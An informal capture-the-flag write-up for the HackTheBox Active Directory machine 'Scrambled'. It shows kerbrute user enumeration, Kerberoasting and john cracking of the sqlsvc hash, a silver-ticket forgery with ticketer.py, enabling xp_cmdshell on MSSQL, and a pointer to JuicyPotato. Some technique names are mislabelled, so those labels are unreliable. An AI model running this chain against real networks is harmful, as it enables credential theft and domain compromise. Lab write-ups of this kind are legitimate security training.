# Scrambled HTB



htb machine active directory 10.10.11.168

smb authentication closed
ldap searching information disabled, nothing to search


## kerbrute user enumeration

users valid:

* asmith
* ksimpson
* khicks
* jhall
* sjekins

*Foothold* sometimes, the user and password could be the same
in some Active Directories services


Performing a kerbrute bruteuser authentication we get the user 
and password ksimpson:ksimpson


## MSSQL attemptin connection
For this step, I will use the mssqlclient.py from impacket

```bash
❯ mssqlclient.py scrm.local/ksimpson:ksimpson@10.10.11.168 -k
Impacket v0.10.1.dev1+20230524.180921.8b3f9eff - Copyright 2022 Fortra

[*] Encryption required, switching to TLS
[-] CCache file is not found. Skipping...
[-] Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
```
I can't perform the authentication, so trying to perform another techniques.

Get if without using a password with the valid-users.txt file
we can get if there are any user 

```bash
❯ GetNPUsers.py scrm.local/ -no-pass -usersfile valid-users.txt
Impacket v0.10.1.dev1+20230524.180921.8b3f9eff - Copyright 2022 Fortra

[-] User asmith doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ksimpson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User khicks doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jhall doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```
But I can't get any TGT for the users, Thus I can make a *ASREPRoast* attack


Now trying to perform a Kerberoasting attack with **GetUserSPNs.py**, I have the password got it in the previous attack 
ksimpson:ksimpson


```bash
❯ GetUserSPNs.py scrm.local/ksimpson:ksimpson -request -dc-host dc1.scrm.local -k
Impacket v0.10.1.dev1+20230524.180921.8b3f9eff - Copyright 2022 Fortra

[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 11:32:02.351452  2023-06-05 20:39:52.699572             
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 11:32:02.351452  2023-06-05 20:39:52.699572             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$6a06ffef2853e709a4d5a1dbf08f659f$9423bb71d20718462561bd51a83f7f9240737dc078d81bb3d858ae350b5487e327bee1a49684ff118db7afab9a730e2dcc352dcc8c2a0849a59e6fb98dd024bde1c1587c16907627b17cf4a4076518d3e2087ca8d878b252df638bdf964c8df57166ba4d91021a6efe1b206532d172be46b840386797d05e60113fad9e558d0049f8a405b49cd3f2cadfc41162a2666f1a13493ec2da5200249d4e7d8f05f254e5ce4a2cdd6e9e6b2a6c87b961cd0bf449e0fceea3b0a39051ad84a8376822523c9806058d31a687cf7d2ad900b82e72f00d155f919c4cd877b1f741f02441395415f6fd6312cb7f2c899a53a32d30264a263685b577f56c77dacb5ecada098af91f058f3f9addd1b8b5d3b2bdb579e39a9323539257fef5ddc7e5eff0d38e5a9d810742f6ec1c102c6737e82fdfc679344fb8dc2c66a1b9476c41212c2d299ae2802b068d14286dd62d84cbf04251c3be847e50ffa6cf5dd53f9c08ee2c303ae0313e1857fa8980348589ad464243455c3e87804358d7fe8e2ef4087b6e716a84cd89236b1b5b2edc803372ecd87260e2a3013f4f8bb2e543595c3e445d506908d56ffc8b54eea315270daf332f6e5f17f5e62b1e8838113ba91c5559bec2d99a340245b16cd02f74027ba9c40b480024570eaee6b497d222625e33b001c1e8054d1fe35b345b13809003640c73761517d7aa2b54ab92f3b612da4bdccc8cb958b526ed0f3dd59e61fa6936e572f8728193c4565a3991fda192e07e3ed98819838c98ce11b14f83d45a2b94d6bd9c9fa20e2e23edc1745216f4ad4039ee623c1057a955e8f4e7e692d2c3f485dcca565d8b3e652d2b6be918e150562b799fc6b43120b7c5fe9fc42108ff552e0dea56317acc72cbef9f4f76a0a5674322c25da4a081ccd1829c969b7e2285f3bc57fef9fa8adea92777989df7b89647e6b73ef90c5db91f7fa0c3a0a12b858e9b98935d44a9396e629f343c1fef718a355876748331dd792454b650761fe325e2b8d1d614043e229bf111295900c7d26ae8226c90aea6a1245be7afd53b48b24b666ba8170fbd9c746abeb154f392429ac599be30da5722c4050998e577089a9b936c6435632fa8c208d54704c91973b8e069c1f5c702455d1cdb068bba3187f795fb8be9db035e6aead13cff499f10ab4224e94ab67eaeacf91659cc912cdb946d2f23342f22065e26717f47677f4044a57384ce1d62603ff883e6e771296ddff94534eacec1e8ef00f2a772b319f4100c8e7d053949b1fd9726f44704a20ec0199d09f8f6673e24ea1b9e4408e9253c2dacbcff1b46f07ddaf5182eba24fb480e4fbd358c0ce3351b1cf7ee9d2fef27d32591eb5f7794f5bdeeaed88c251b184bb6ff0ebb70ee752eb1e4ab3552eff6e922f181b26b829599c78f08ea316fdd06e63c418249c59f1d10ece607
```

As we can see, the Silver Ticket Attack (TGS) was success
Trying to decrypt that hash using john

Store the hash i has this password


```bash
❯ john --wordlist=/usr/share/wordlist/Passwords/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Pegasus60        (?)
1g 0:00:00:04 DONE (2023-06-05 22:41) 0.2083g/s 2235Kp/s 2235Kc/s 2235KC/s Penrodyn..Pearbaby1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

hash from ntlm sqlsvc:Pegasus60


Performing to get a TGt, we use getTGT.py to get a cache file
and export it as 
```bash
export KRB5CCNAME=sqlsvc.ccache
```
and try to perform antoher connection with mssqlclient.py

```bash
❯ mssqlclient.py dc1.scrm.local -k
Impacket v0.10.1.dev1+20230524.180921.8b3f9eff - Copyright 2022 Fortra

[*] Encryption required, switching to TLS
[-] ERROR(DC1): Line 1: Login failed for user 'SCRM\sqlsvc'.
```

## Silver Ticket Attack

* NTLM hash => b999a16500b87d17ec7f2e2a68778f05 
* Doamin SID S-1-5-21-2743207045-1827831105-2542523200
* SPN 500 for adminsitrator

ticketer.py

```bash
ticketer.py -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -dc-ip dc1.scrm.local -spn MSSQLSvc/dc1.scrm.local -domain scrm.local Administrator
```


```bash
❯ mssqlclient.py dc1.scrm.local -k
Impacket v0.10.1.dev1+20230524.180921.8b3f9eff - Copyright 2022 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC1): Line 1: Changed database context to 'master'.
[*] INFO(DC1): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (SCRM\administrator  dbo@master)> 
```

connected

Once connected, we try to perform command excution with

```bash
xp_cmdshell "whoami"

EXEC sp_configure "show advanced options", '1'
RECONFIGURE

EXEC sp_configure "xp_cmdshell", '1'
RECONFIGURE
```



```powershell
C:\Windows\system32>whoami
whoami
scrm\sqlsvc

C:\Windows\system32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

C:\Windows\system32>
```

using the permissions "windows privesc SeImpersonatePrivilege"

for github JuicyPotato we get a Adminstrator system access
